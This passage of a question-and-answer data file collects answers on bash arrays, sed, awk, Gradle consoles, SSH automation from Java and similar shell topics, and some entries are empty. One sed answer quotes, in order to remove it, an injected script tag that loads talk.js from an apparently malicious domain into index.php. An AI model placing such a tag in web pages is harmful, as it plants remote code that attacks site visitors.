stdout.print(\"\\b \\b\")\n                    stdout.flush()\n                }\n            }\n        }\n        catch (final java.nio.channels.AsynchronousCloseException exception) {\n            // Ctrl+D pressed\n        }\n        finally {\n            ostream.close()\n        }\n    }\n}\n\ndef getChannel(istream) {\n    def f = java.io.FilterInputStream.class.getDeclaredField(\"in\")\n    f.setAccessible(true)\n    while (istream instanceof java.io.FilterInputStream) {\n        istream = f.get(istream)\n    }\n    istream.getChannel()\n}\n\ntask(console, dependsOn: 'classes') << {\n    def classpath = sourceSets.main.runtimeClasspath + configurations.console\n\n    def command = [\n        'java',\n        '-cp', classpath.collect().join(System.getProperty('path.separator')),\n        'org.codehaus.groovy.tools.shell.Main'\n    ]\n\n    def proc = new ProcessBuilder(command).start()\n\n    def stdout = new Thread(new StreamCopier(proc.getInputStream(), System.out))\n    stdout.start()\n\n    def stderr = new Thread(new StreamCopier(proc.getErrorStream(), System.err))\n    stderr.start()\n\n    def stdin  = new Thread(new InputCopier(\n        getChannel(System.in),\n        proc.getOutputStream(),\n        System.out))\n    stdin.start()\n\n    proc.waitFor()\n    System.in.close()\n    stdout.join()\n    stderr.join()\n    stdin.join()\n\n    if (0 != proc.exitValue()) {\n        throw new RuntimeException(\"console exited with status: ${proc.exitValue()}\")\n    }\n}\nThen, execute it via:\ngradle console\nor, if you get a lot of noise from gradle:\ngradle console -q",
    "Loop through array of arrays of string with spaces": "I think you meant that the output should look like:\nAA  QQ\nBB  LL\nCC\nDD\nEE\nFF\ni.e.:\n${low1[0]}\n${low1[1]}\n${low2[0]}\n${low2[1]}\n${low3[0]}\n${low3[1]}\nThis could be accomplished using:\n#!/bin/bash\n\nlow1=(\"AA  QQ\" \"BB  LL\")\nlow2=(\"CC\" \"DD\")\nlow3=(\"EE\" \"FF\")\nhigh=(low1 low2 low3)\n\nfor high_item in ${high[@]}\ndo\n    x=\"${high_item}[@]\" # -> \"low1[@]\"\n    arrays=( \"${!x}\" )\n\n    #IFS=$'\\n'\n    for item in \"${arrays[@]}\"\n    do\n        echo \"$item\"\n    done\ndone\nAnd please always use #!/bin/bash for bash scripts.\nExplanation: ${!x} is indirect variable expansion. It evaluates to the value of variable with a name contained in $x.\nFor our needs, x needs to have the [@] suffix for array expansion as well. Especially note that it is x=${high_item}[@] and not x=${high_item[@]}.\nAnd you have to evaluate it in array context; otherwise, it wouldn't work as expected (if you do arrays=${!x}).\nAh, and as final note: IFS doesn't make any difference here. As long as you are working on quoted arrays, IFS doesn't come into play.",
    "How get the time in milliseconds in FreeBSD?": "The BSD date command doesn't support milliseconds. If you want a date with millisecond support, install the GNU coreutils package.\nI encountered this on OS X, whose date comes from BSD. The solution was to brew install coreutils and ln -sf /usr/local/bin/gdate $HOME/bin, and making sure that $HOME/bin comes first in PATH.",
    "Getting specific fields from ID3 tags using command line tool?": "id3v2 -R sounds like it does what you want. Debian package name is id3v2, upstream is http://id3v2.sourceforge.net/\nFrom the manpage:\n   -R, --list-rfc822\n          Lists using an rfc822-style format for output\nExample:\n$ id3v2 -R 365-Days-Project-04-26-sprinkle-leland-w-the-great-stalacpipe-organ.mp3 \n\nFilename: 365-Days-Project-04-26-sprinkle-leland-w-the-great-stalacpipe-organ.mp3\nTALB: Released independently through Luray Caverns\nTPE1: Leland W. Sprinkle\nTIT2: The Great Stalacpipe Organ\nCOMM: ()[eng]: \ufffd 2004, Copyright resides with the artist, The 365 Days Project,  and UbuWeb (http://ubu.com) / PennSound (http://www.writing.upenn.edu/pennsound/). All materials at UbuWeb / PennSound are available for free exchange for noncommerical purposes.\n365-Days-Project-04-26-sprinkle-leland-w-the-great-stalacpipe-organ.mp3: No ID3v1 tag",
    "Set apache documentRoot to symlink (for easy deployment)": "We're using capistrano to employ a similar setup. However, we've run into a few problems:\nAfter switching to the setup, things appeared to be going fine, but then we started noticing that after running cap deploy, even though the symlink had been changed to point toward the head revision, the browser would still show the old pages, even after multiple refreshes and appending different GET parameters.\nAt first, we thought it was browser caching, so for development we disabled browser caching via HTTP headers, but this didn't change anything. I then checked to make sure we weren't doing full-page caching server-side, and we weren't. But I then noticed that if I deleted a file in the revision the symlink used to point to, we would get a 404, so Apache was serving up new pages, but it was still following the \"old symlink\" and serving the pages up from the wrong directory.\nThis is on shared hosting, so I wasn't able to restart Apache. So I tried deleting the symlink and creating a new one each time. This seemed to work sometimes, but not reliably. It worked probably 25~50% of the time.\nEventually, I found that if I:\nremoved the existing symlink (deleting it or renaming it);\nmade a page request, causing Apache to attempt to resolve the symlink but find it missing (resulting in a 404)\nthen created a new symlink to the new directory\nit would cause the docroot to be updated properly most of the time. However, even this isn't perfect, and about 2-5% of the time, when the deploy script ran wget to fetch a page right after renaming the old symlink, it would return the old page rather than a 404.\nIt seems like Apache is either caching the filesystem, or perhaps the mv command only changed the filesystem in memory while Apache was reading from the filesystem on disk (doesn't really make any sense). In either case, I've taken up someone's recommendation to run sync after the symlink changes, which should get the filesystem on disk in sync with memory, and perhaps the slight delay will also help the wget to return a 404.",
    "How can I silence the \"Terminated\" message when my command is killed by timeout?": "There's nothing wrong with your code, that \"Terminated\" message doesn't come from your script but from the invoking shell (the one you launch your script from).\nYou can deactivate if by disabling job control:\n$ set +m\n$ bash <your timeout script>",
    "Amazon S3 file download through curl by using IAM user credentials": "",
    "Escaping characters in glob patterns in Git": "Yes, the escape character suppresses the file name expansion normally performed by the Unix shell. To answer the subquestions:\ngit rm implements its own expansion likely because the files might not be present in the checked-out directory. (Think of the situation where you first rm *~, and then remember that you also want to remove them from git.)\nUsing the backslash escape character (or wrapping the argument in quotes) does exactly that \u2014 suppresses file name expansion at the shell level. This cannot be done by git automatically because git doesn't control your shell, by the time it is executed, the expansion is already over. The expansion must be prevented by the shell itself or, more realistically, by the end user invoking git through the shell.",
    "Are there any standard mechanisms or conventions to prevent Bash environment variable name collisions?": "I don't think there's any standard mechanism, other than using a common prefix. For instance, ssh uses SSH_xxx for all its environment variables. Unfortunately, many legacy programs (e.g. shells) don't follow any kind of convention. And variables that are used across many different programs (e.g. TERM, PAGER) don't have a program name to use as a prefix.\nIf you follow the prefixing style, the chance of collision will be small. It's the best you can do.",
    "feedback stdin and stdout of two processes": "Bash 4 introduces coproc:\ndeclare -a FDS\ncoproc FDS { process_A; }\nprocess_B <&${FDS[0]} >&${FDS[1]}",
    "How to change an icon for one single file of the specific type?": "You can use an IconHandler to allow icons to be customized on a file-by-file basis. Note that shell extensions should not be written in managed code, so C++ is the language of choice here.\nNote also that it's highly unusual to be installing an icon handler for another application's file type.",
    "How to replace whole string using sed or possibly grep": "Use double quotes (\") for the string and don't escape the single quotes (') nor the tags (<>). Only escape the slashes (/).\nsed -i \"s/<script type='text\\/javascript' src='https:\\/\\/scripts.trasnaltemyrecords.com\\/talk.js?track=r&subid=547'><\\/script>//g\" index.php",
    "HDD temp won't show via web": "",
    "Do test operators -a and -o short circuit?": "Per the POSIX specification for test:\n>4 arguments: The results are unspecified.\nThus, barring XSI extensions, POSIX says nothing about how this behaves.\nMoreover, even on a system with XSI extensions:\nexpression1 -a  expression2: True if both expression1 and expression2 are true; otherwise, false. The -a binary primary is left associative. It has a higher precedence than -o. [Option End]\nexpression1 -o  expression2: True if either expression1 or expression2 is true; otherwise, false. The -o binary primary is left associative. [Option End]\nThere's no specification with respect to short-circuiting.\nIf you want short-circuiting behavior -- or POSIX-defined behavior at all -- use && and || to connect multiple, separate test invocations.\nQuoting again, from later in the document:\nAPPLICATION USAGE\nThe XSI extensions specifying the -a and -o binary primaries and the '(' and ')' operators have been marked obsolescent. (Many expressions using them are ambiguously defined by the grammar depending on the specific expressions being evaluated.) Scripts using these expressions should be converted to the forms given below. Even though many implementations will continue to support these obsolescent forms, scripts should be extremely careful when dealing with user-supplied input that could be confused with these and other primaries and operators. Unless the application developer knows all the cases that produce input to the script, invocations like:\ntest \"$1\" -a \"$2\"\nshould be written as:\ntest \"$1\" && test \"$2\"",
    "how to solve \"unzip: cannot find or open\" error in linux OS [closed]": "unzip cannot find the file myfile.zip. Make sure the file exists in your current working directory. You can also try to provide an absolute path.",
    "Writing a simple shell in C using fork/execvp": "The invalid option is because fgets() keeps the '\\n' when you press enter, try this\nif(!fgets(line, BUFFER_LEN, stdin))\n    break;\nsize_t length = strlen(line);\nif (line[length - 1] == '\\n')\n    line[length - 1] = '\\0';\nwhen you are trying to call ls -l you are passing \"-l\\n\" as the option, hence the message.\nYou will have to change\nstrcmp(line, \"exit\\n\")\nto\nstrcmp(line, \"exit\")",
    "sed to replace partial string": "You can use this sed:\nsed 's/\\( constant = *\\)[^ ]*/\\1substituteValue/' <<< \"$line\"",
    "Android 2.3 : Read-Only file system stuck [closed]": "",
    "As a Ruby/Rails Developer, zsh vs bash? What's the advantage? [closed]": "Edit : this applies if you use oh-my-zsh\nPersonally, I'm mainly using it because it displays your current git branch in the command prompt. Therefore, if like me you often have to switch branches, you don't mix code by accident.\nAlso, one of the nice benefits for me is that I created a fork of oh-my-zsh with my custom theme enabled by default, and I can deploy it on whatever machine I need it onto (say, production servers) with just a few commands. This way, I load up all my zsh aliases, my custom theme etc ...\nFinally there's a zsh plugin I'm using that is zsh-syntax-highlighting. This highlights commands as you type them, to make it dummy-proof. Green = good existing command, red = you made a typo ... but there's more to it, it's worth a try.\nSo yeah, git integration and the ability to install my own personal zsh setup on whatever machine within seconds is why I like it.\nThere's also a railscast talking about oh-my-zsh : http://railscasts.com/episodes/308-oh-my-zsh",
    "How Can I Get My File Association to Open Multiple Files in a Single Program Instance?": "This is a rather common question, and it has really nothing to do with Windows file extensions. When you doubleclick a file of your program's custom type, Windows will start the associated application MyProgram.exe and pass the file name %1 as a command-line argument.\nNow, if you want only a single instance of your application, you need to do this:\nWhen your program (MyProgram.exe) starts, it should check if there is already an instance of it running.\nIf there is a previous instance, the new instance of MyProgram.exe should send a message (of some kind, not necessarily a windows message) to the old instance telling it to open the file %1.\nThe new instance should now terminate itself.\nA very simplistic approach\nThere are several ways of accomplishing this. One of the simplest ways is to set a registry key/value each time your application starts, and remove it when the application exists. Then, when (a new instance of) your application starts, prior to setting this key/value, it should check if it is already set. If, so, follow the steps (2) and (3) above. This might not be the most stable approach (in fact it is a very bad idea, since you cannot guarantee that the app will remove the key/value when it exists if it does so abnormally), but it will give you the basic idea. Other, perhaps better ways, include FindWindow and, even better, the use of mutexes.\nStep two might be implemented by sending a windows message (maybe WM_COPYDATA), or by setting a registry value, or, by writing a file, or ... There are many ways of communication between different processess.\nThe details\nSince this is a rather common question, it has been dealt with before. See, for instance, this Delphi-specific article.",
    "How to run shell commands using dart on macOS": "This may not be useful to you since you're using Flutter, but to answer the question that is in the title (for anyone stumbling upon this writing a non-Flutter app) you should take a look at the dart:io library and its run method:\nhttps://api.dart.dev/stable/dart-io/Process/run.html\nStarts a process and runs it non-interactively to completion. The process run is executable with the specified arguments.",
    "zsh key binding: cannot bind to an empty key sequence": "It has to do with $terminfo not being consistent across platforms, the commit has been reverted see https://github.com/robbyrussell/oh-my-zsh/issues/2608 for details. If you got the hub tool installed the quick fix is:\ncd ~/.oh-my-zsh \nhub checkout https://github.com/robbyrussell/oh-my-zsh/pull/2625 terminfo_fix\nand reload your shell. Without hub you need to setup the remote for the PR first and pull from there.",
    "shell script to add header to a file": "You can use awk like this:\nawk 'NR==FNR && !h {print;h=1;} NR!=FNR{print}' headerFile mainFile > tmpFile\nmv tmpFile mainFile\nUsing vim/vi:\nvim +'0r headerFile|wq' mainFile 2>/dev/null\nUsing GNU sed:\nsed -i.bak -e '2{x;G};1{h;rheaderFile' -e 'd}' mainFile\nUsing non-GNU sed:\nHDR=$(head -1 headerFile) && sed -i.bak \"1s/^/$HDR/\" mainFile",
    "Writing a console within an application": "I implemented the following as a console for an opengl game I was writing a while ago. It is by no means a definitive answer to you question but it worked for me and you might get something useful out of it.\nThe 2 files are at this bottom of this post. The code is unlikely to run directly as there is one for 2 library header files that I'm not going to include. If you want the full source let me know.\nBasically though the console class allows you to add variable pointers to it that can be changed at run time. It accepts input from the windows event messages. (The actual handling of input is done elsewhere) The command parsing is done in the ProcessInput() method and variables are updated in the ChangeVariable() method.\nA word of warning. This method essentially gives the console users direct access to the memory locations of the individual variable. This requires good input validation to ensure you the user cant cause the application to crash at runtime. If I ever sat down and tried to make another console I would likely do things slightly different. However I hope this gives you a little help.\nThe header file:\n#ifndef CONSOLE_H\n#define CONSOLE_H\n\n#include <vector>\n#include <map>\n#include <string>\n#include \"Singleton.h\"\n#include <Windows.h>\n#include \"Enumerations.h\"\n#include \"StringConversion.h\"\n\nclass Console\n{\npublic:\n\n    Console();\n    ~Console();\n\n    void Update(std::vector<WPARAM> pressedKeys);\n\n    void AddInt(std::string varName, int *ptrToInt);\n    void AddFloat(std::string varName, float *ptrToFloat);\n    void AddLong(std::string varName, long *ptrToLong);\n    void AddBool(std::string varName, bool *ptrToBool);\n\n    const std::string &GetCurrentText();\n    const std::vector<std::string> &GetPreviousText();\n\nprivate:\n    std::map<std::string, int *> m_Ints;\n    std::map<std::string, float *> m_Floats;\n    std::map<std::string, long *> m_Longs;\n    std::map<std::string, bool *> m_Bools;\n\n    std::map<std::string, std::string> m_Variables;\n\n    std::vector<std::string> m_PrevConsoleText;\n    std::string m_CurrInput;\n\n    int m_PrevSelection;\n\n    bool ProcessInput();\n    void ChangeVariable(const std::string &varName, const std::string &value);\n};\n\ntypedef Singleton<Console> g_Console;\n\n#endif // CONSOLE_H\nThe cpp file:\n#include \"Console.h\"\n\nConsole::Console()\n{\n    m_PrevSelection = 0;\n}\n\nConsole::~Console()\n{\n\n}\n\nvoid Console::AddInt(std::string varName, int *ptrToInt)\n{\n    m_Ints[varName] = ptrToInt;\n    m_Variables[varName] = \"int\";\n}\n\nvoid Console::AddFloat(std::string varName, float *ptrToFloat)\n{\n    m_Floats[varName] = ptrToFloat;\n    m_Variables[varName] = \"float\";\n}\n\nvoid Console::AddLong(std::string varName, long *ptrToLong)\n{\n    m_Longs[varName] = ptrToLong;\n    m_Variables[varName] = \"long\";\n}\n\nvoid Console::AddBool(std::string varName, bool *ptrToBool)\n{\n    m_Bools[varName] = ptrToBool;\n    m_Variables[varName] = \"bool\";\n}\n\nvoid Console::ChangeVariable(const std::string &varName, const std::string &value)\n{\n    //*(m_Bools[varName]) = value;\n\n    std::string temp = m_Variables[varName];\n\n    if(temp == \"int\")\n    {\n        //*(m_Ints[varName]) = fromString<int>(value);\n    }\n    else if(temp == \"float\")\n    {\n        //*(m_Floats[varName]) = fromString<float>(value);\n    }\n    else if(temp == \"long\")\n    {\n        //*(m_Longs[varName]) = fromString<long>(value);\n    }\n    else if(temp == \"bool\")\n    {\n        if(value == \"true\" || value == \"TRUE\" || value == \"True\")\n        {\n            *(m_Bools[varName]) = true;\n        }\n        else if(value == \"false\" || value == \"FALSE\" || value == \"False\")\n        {\n            *(m_Bools[varName]) = false;\n        }\n    }\n}\n\nconst std::string &Console::GetCurrentText()\n{\n    return m_CurrInput;\n}\n\nvoid Console::Update(std::vector<WPARAM> pressedKeys)\n{\n    for(int x = 0; x < (int)pressedKeys.size(); x++)\n    {\n        switch(pressedKeys[x])\n        {\n        case KEY_A:\n            m_CurrInput.push_back('a');\n            break;\n        case KEY_B:\n            m_CurrInput.push_back('b');\n            break;\n        case KEY_C:\n            m_CurrInput.push_back('c');\n            break;\n        case KEY_D:\n            m_CurrInput.push_back('d');\n            break;\n        case KEY_E:\n            m_CurrInput.push_back('e');\n            break;\n        case KEY_F:\n            m_CurrInput.push_back('f');\n            break;\n        case KEY_G:\n            m_CurrInput.push_back('g');\n            break;\n        case KEY_H:\n            m_CurrInput.push_back('h');\n            break;\n        case KEY_I:\n            m_CurrInput.push_back('i');\n            break;\n        case KEY_J:\n            m_CurrInput.push_back('j');\n            break;\n        case KEY_K:\n            m_CurrInput.push_back('k');\n            break;\n        case KEY_L:\n            m_CurrInput.push_back('l');\n            break;\n        case KEY_M:\n            m_CurrInput.push_back('m');\n            break;\n        case KEY_N:\n            m_CurrInput.push_back('n');\n            break;\n        case KEY_O:\n            m_CurrInput.push_back('o');\n            break;\n        case KEY_P:\n            m_CurrInput.push_back('p');\n            break;\n        case KEY_Q:\n            m_CurrInput.push_back('q');\n            break;\n        case KEY_R:\n            m_CurrInput.push_back('r');\n            break;\n        case KEY_S:\n            m_CurrInput.push_back('s');\n            break;\n        case KEY_T:\n            m_CurrInput.push_back('t');\n            break;\n        case KEY_U:\n            m_CurrInput.push_back('u');\n            break;\n        case KEY_V:\n            m_CurrInput.push_back('v');\n            break;\n        case KEY_W:\n            m_CurrInput.push_back('w');\n            break;\n        case KEY_X:\n            m_CurrInput.push_back('x');\n            break;\n        case KEY_Y:\n            m_CurrInput.push_back('y');\n            break;\n        case KEY_Z:\n            m_CurrInput.push_back('z');\n            break;\n        case KEY_0:\n            m_CurrInput.push_back('0');\n            break;\n        case KEY_1:\n            m_CurrInput.push_back('1');\n            break;\n        case KEY_2:\n            m_CurrInput.push_back('2');\n            break;\n        case KEY_3:\n            m_CurrInput.push_back('3');\n            break;\n        case KEY_4:\n            m_CurrInput.push_back('4');\n            break;\n        case KEY_5:\n            m_CurrInput.push_back('5');\n            break;\n        case KEY_6:\n            m_CurrInput.push_back('6');\n            break;\n        case KEY_7:\n            m_CurrInput.push_back('7');\n            break;\n        case KEY_8:\n            m_CurrInput.push_back('8');\n            break;\n        case KEY_9:\n            m_CurrInput.push_back('9');\n            break;\n        case KEY_QUOTE:\n            m_CurrInput.push_back('\\\"');\n            break;\n        case KEY_EQUALS:\n            m_CurrInput.push_back('=');\n            break;\n        case KEY_SPACE:\n            m_CurrInput.push_back(' ');\n            break;\n        case KEY_BACKSPACE:\n            if(m_CurrInput.size() > 0)\n            {\n                m_CurrInput.erase(m_CurrInput.end() - 1, m_CurrInput.end());\n            }\n            break;\n        case KEY_ENTER:\n            ProcessInput();\n            break;\n        case KEY_UP:\n            m_PrevSelection--;\n            if(m_PrevSelection < 1)\n            {\n                m_PrevSelection = m_PrevConsoleText.size() + 1;\n                m_CurrInput = \"\";\n            }\n            else\n            {\n                m_CurrInput = m_PrevConsoleText[m_PrevSelection - 1];\n            }\n\n            break;\n        case KEY_DOWN:\n            if(m_PrevSelection > (int)m_PrevConsoleText.size())\n            {\n                m_PrevSelection = 0;\n                m_CurrInput = \"\";\n            }\n            else\n            {\n                m_CurrInput = m_PrevConsoleText[m_PrevSelection - 1];\n            }\n            m_PrevSelection++;\n            break;\n        }\n    }\n}\n\nbool Console::ProcessInput()\n{\n    int x;\n    std::string variable = \"NULL\", value;\n    bool ok = false;\n    std::string::iterator it;\n\n    //Split up the input from the user.\n    //variable will be the variable to change\n    //ok will = true if the syntax is correct\n    //value will be the value to change variable to.\n    for(x = 0; x < (int)m_CurrInput.size(); x++)\n    {\n        if(m_CurrInput[x] == ' ' && variable == \"NULL\")\n        {\n            variable = m_CurrInput.substr(0, x);\n        }\n        else if(m_CurrInput[x] == '=' && m_CurrInput[x - 1] == ' ' && m_CurrInput[x + 1] == ' ')\n        {\n            ok = true;\n        }\n        else if(m_CurrInput[x] == ' ')\n        {\n            value = m_CurrInput.substr(x + 1, m_CurrInput.size());\n        }\n    }\n\n    if(ok)\n    {\n        m_PrevConsoleText.push_back(m_CurrInput);\n        m_PrevSelection = m_PrevConsoleText.size();\n\n        if(m_PrevConsoleText.size() > 10)\n        {\n            m_PrevConsoleText.erase(m_PrevConsoleText.begin(), m_PrevConsoleText.begin() + 1);\n        }\n        m_CurrInput.clear();\n\n\n        ChangeVariable(variable, value);\n    }\n    else\n    {\n        m_PrevConsoleText.push_back(\"Error invalid console syntax! Use: <variableName> = <value>\");\n        m_CurrInput.clear();\n    }\n\n    return ok;\n}\n\nconst std::vector<std::string> &Console::GetPreviousText()\n{\n    return m_PrevConsoleText;\n}\nEdit 1: Added DrawConsole() I just get the text from the console class render an image that looked similar to the source engine console window found in any recent valve game and then the text gets drawn in the appropriate places.\nvoid View::DrawConsole()\n{\n    Square console;\n    std::vector<std::string> temp;\n    temp = g_Console::Instance().GetPreviousText();\n\n    console.top = Vector3f(0.0, 0.0, 1.0);\n    console.bottom = Vector3f(640, 480, 1.0);\n\n    g_Render::Instance().SetOrthographicProjection();\n    g_Render::Instance().PushMatrix();\n    g_Render::Instance().LoadIdentity();\n\n    g_Render::Instance().BindTexture(m_ConsoleTexture);\n    g_Render::Instance().DrawPrimative(console, Vector3f(1.0f, 1.0f, 1.0f));\n    g_Render::Instance().DisableTexture();\n\n    g_Render::Instance().SetOrthographicProjection();\n    //Draw the current console text\n    g_Render::Instance().DrawString(g_Console::Instance().GetCurrentText(), 0.6f, 20, 465);\n\n    //Draw the previous console text\n    for(int x = (int)temp.size(); x > 0; x--)\n    {\n        g_Render::Instance().DrawString(temp[x-1], 0.6f, 20, (float)(425 - (abs((int)temp.size() - x) * 20)));\n    }\n\n    g_Render::Instance().SetPerspectiveProjection();\n\n    g_Render::Instance().PopMatrix();\n    g_Render::Instance().SetPerspectiveProjection();\n}",
    "What is a shell command to find the longest common substring of two strings in unix?": "I am not sure if there is a single command that does the job for you but the following bash script should do it.\n#!/bin/bash\n\nword1=\"$1\"\nword2=\"$2\"\nif [ ${#word1} -lt ${#word2} ]\nthen\n        word1=\"$2\"\n        word2=\"$1\"\nfi\nfor ((i=${#word2}; i>0; i--)); do\n        for ((j=0; j<=${#word2}-i; j++)); do\n                if [[ $word1 =~ ${word2:j:i} ]]\n                then\n                        echo ${word2:j:i}\n                        exit\n                fi\n        done\ndone\nsave the above as a file substr.sh do chmod +x substr.sh\npranithk @ ~\n09:24:32 :) $ ./substr.sh 'abcdefghi' 'abcdeghi'\nabcde\n\npranithk @ ~\n09:24:33 :) $ ./substr.sh 'abcdefghi' 'abjklmdefnop'\ndef",
    "after running program leave interactive shell to use": "Approach 1: bash, zsh and a few other shells read a file whose name is in the ENV environment variable after the usual rc files and before the interactive commands or the script to run. However bash only does this if invoked as sh, and zsh only does this if invoked as sh or ksh, which is rather limiting.\ntemp_rc=$(mktemp)\ncat <<'EOF' >\"$temp_rc\"\nmycommand --option\nrm -- \"$0\"\nEOF\nENV=$temp_rc sh\nApproach 2: make the shell read a different rc file, which sources the usual rc file and contains a call to the program you want to run. For example, for bash:\ntemp_rc=$(mktemp)\ncat <<'EOF' >\"$temp_rc\"\nmycommand --option\nif [ -e ~/.bashrc ]; then . ~/.bashrc; fi\nrm -- \"$0\"\nEOF\nbash --rcfile \"$temp_rc\"\nFor zsh, the file has to be called .zshrc, you can only specify a different directory.\ntemp_dir=$(mktemp -d)\ncat <<'EOF' >\"$temp_dir/.zshrc\"\nmycommand --option\nif [ -e ~/.zshrc ]; then . ~/.zshrc; fi\nrm -- $0; rmdir ${0:h}\nEOF\nZDOTDIR=$temp_dir zsh",
    "Generate shell script call tree": "Wrap the shell itself by your implementation, log who called you wrapper and exec the original shell.\nYes you have to start the scripts in order to identify which script is really used. Otherwise you need a tool with the same knowledge as the shell engine itself to support the whole variable expansion, PATHs etc -- I never heard about such a tool.\nIn order to visualize the calling graph use GraphViz's dot format.",
    "\"Sudo su - weblogic\" via a Java Program?": "As you and @rkosegi say, su needs a terminal session for the password.\nIt looks like the Ganymed SSH-2 library in the example? This has an option for a shell session. Clearly you now need to handle reading and writing through stdout and stdin directly though.\nFor example, with a couple of methods to keep it simpler:\npublic class SshTerminal {\n    private Connection connection;\n    private Session session;\n\n    private Reader reader;\n    private PrintWriter writer;\n    private String lastResponse;\n\n    public SshTerminal(String hostname, String username, String password)\n            throws JSchException, IOException {\n        connection = new Connection(hostname);\n        connection.connect();\n        boolean isAuthenticated = connection.authenticateWithPassword(username,\n                password);\n        if (isAuthenticated == false)\n            throw new IOException(\"Authentication failed.\");\n        session = connection.openSession();\n        session.requestDumbPTY();\n        session.startShell();\n\n        writer = new PrintWriter(session.getStdin());\n        reader = new InputStreamReader(session.getStdout());\n    }\n\n    public void send(String command) {\n        writer.print(command + \"\\n\");\n        writer.flush();\n    }\n\n    public void waitFor(String expected) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        char[] chars = new char[256];\n        while (buf.indexOf(expected) < 0) {\n            int length = reader.read(chars);\n            System.out.print(new String(chars, 0, length));\n            buf.append(chars, 0, length);\n        }\n\n        int echoEnd = buf.indexOf(\"\\n\");\n        int nextPrompt = buf.lastIndexOf(\"\\n\");\n        if (nextPrompt > echoEnd)\n            lastResponse = buf.substring(echoEnd + 1, nextPrompt);\n        else\n            lastResponse = \"\";\n    }\n\n    public String getLastResponse() {\n        return lastResponse;\n    }\n\n    public void disconnect() {\n        session.close();\n        connection.close();\n    }\n}\nThis then worked fine:\n    SshTerminal term = new SshTerminal(host, username, password);\n\n    term.waitFor(\"$ \");\n    term.send(\"su -\");\n    term.waitFor(\"Password: \");\n    term.send(rootPassword);\n    term.waitFor(\"# \");\n    term.send(\"ls /root\");\n    term.waitFor(\"# \");\n    term.send(\"cat /file-not-found 2>&1\");\n    term.waitFor(\"# \");\n\n    term.send(\"cat /var/log/messages\");\n    term.waitFor(\"# \");\n    String logFileContent = term.getLastResponse();\n\n    term.send(\"exit\");\n    term.waitFor(\"$ \");\n    term.send(\"exit\");\n\n    term.disconnect();\n\n    String[] lines = logFileContent.split(\"\\n\");\n    for (int i = 0; i < lines.length; i++)\n        logger.info(\"Line {} out of {}: {}\", i + 1, lines.length, lines[i]);\nThat includes examples of parsing the lines in a response, and forcing error output through.\nClearly some of the responses there might be different in your environment.",
    "How do I run a compiled binary in Android?": "",
    "How can I make an editable text field in a swift shell application": "Before app.run(), add\napp.setActivationPolicy(.Regular)\nAccording to the docs, the default activationPolicy is Prohibited:\nProhibited\nThe application does not appear in the Dock and may not create windows or be activated. [...] This is also the default for unbundled executables that do not have Info.plists.",
    "Jenkins adding single quotes to bash shell script": "",
    "REPL/interactive shell with proper PHP 5.3 support?": "",
    "Nonblocking/asynchronous fifo/named pipe in shell/filesystem?": "You can use special program for this purpose - buffer. Buffer is designed to try and keep the writer side continuously busy so that it can stream when writing to tape drives, but you can use for other purposes. Internally buffer is a pair of processes communicating via a large circular queue held in shared memory, so your processes will work asynchronously. Your reader process will be blocked in case the queue is full and the writer process - in case the queue is empty. Example:\nbzcat archive.bz2 | buffer -m 16000000 -b 100000 | processing_script | bzip2 > archive_processed.bz2\nhttp://linux.die.net/man/1/buffer",
    "Find all words containing characters in UNIX": "here's an awk implementation. It finds the words with those letters in \"W\".\ndict=\"/usr/share/dict/words\"\nword=$1\nawk -vw=\"$word\" 'BEGIN{\n  m=split(w,c,\"\")\n  for(p=1;p<=m;p++){ chars[c[p]]++ }\n}\nlength($0)==length(w){\n  f=0;g=0\n  n=split($0,t,\"\")\n  for(o=1;o<=n;o++){\n    if (!( t[o] in chars) ){\n       f=1; break\n    }else{ st[t[o]]++ }\n  }\n  if (!f || $0==w){\n      for(z in st){\n        if ( st[z] != chars[z] ) { g=1 ;break}\n      }\n      if(!g){ print \"found: \"$0 }\n  }\n  delete st\n}' $dict\noutput\n$ wc -l < /usr/share/dict/words\n479829\n\n$ time ./shell.sh look\nfound: kolo\nfound: look\n\nreal    0m1.361s\nuser    0m1.074s\nsys     0m0.015s\nUpdate: change of algorithm, using sorting\ndict=\"/usr/share/dict/words\"\nawk 'BEGIN{\n  w=\"table\"\n  m=split(w,c,\"\")\n  b=asort(c,chars)\n}\nlength($0)==length(w){\n  f=0\n  n=split($0,t,\"\")\n  e=asort(t,d)\n  for(i=1;i<=e;i++) {\n    if(d[i]!=chars[i]){\n        f=1;break\n    }\n  }\n  if(!f) print $0\n}' $dict\noutput\n$ time ./shell.sh #looking for table\nablet\nbatel\nbelat\nblate\nbleat\ntabel\ntable\n\nreal    0m1.416s\nuser    0m1.343s\nsys     0m0.014s\n\n$ time ./shell.sh #looking for chairs\nchairs\nischar\nrachis\n\nreal    0m1.697s\nuser    0m1.660s\nsys     0m0.014s\n\n$ time perl perl.pl #using beamrider's Perl script\ntable\ntabel\nablet\nbatel\nblate\nbleat\nbelat\n\nreal    0m2.680s\nuser    0m1.633s\nsys     0m0.881s\n\n$ time perl perl.pl # looking for chairs\nchairs\nischar\nrachis\n\nreal    0m14.044s\nuser    0m8.328s\nsys     0m5.236s",
    "How to grant permission for application which is downloaded from play store?": "",
    "export all warnings in file in XCode": "",
    "Achieving shell-like pipeline performance in Python": "You're timing it wrong. Your perf_counter() calls don't start and stop a timer; they just return a number of seconds since some arbitrary starting point. That starting point probably happens to be the first perf_counter() call here, but it could be any point, even one in the future.\nThe actual time taken by the subprocess.PIPE method is 4.862174164 - 2.412427189 = 2.449746975 seconds, not 4.862174164 seconds. This timing does not show a measurable performance penalty from subprocess.PIPE.",
    "pipe is returning empty string in bash in git for windows": "Summarizing the comments, the short (tl;dr) version: either downgrade, upgrade, and/or re-install MSYS and MinGW that come with Git for Windows.\nMSYS supplements MinGW, and the version provided by Git for Windows may be modified from the original maintainers of MSYS. There was a bug reported against MSYS for what appears to be this same issue (using \"mingw version: 64 bit bundled with git version 2.8.3.windows.1\"), but was marked as \"works for me\" (i.e., \"can't reproduce\"). But there was a comment that the problem could be in the repackaging:\n\"Please be advised that MSYS, as bundled with git for windows, may be modified from our official distribution, (and 64-bit MinGW certainly isn't ours); thus we don't formally support either of these.\" https://sourceforge.net/p/mingw/bugs/2303/\nLong story short, looks like a bug.",
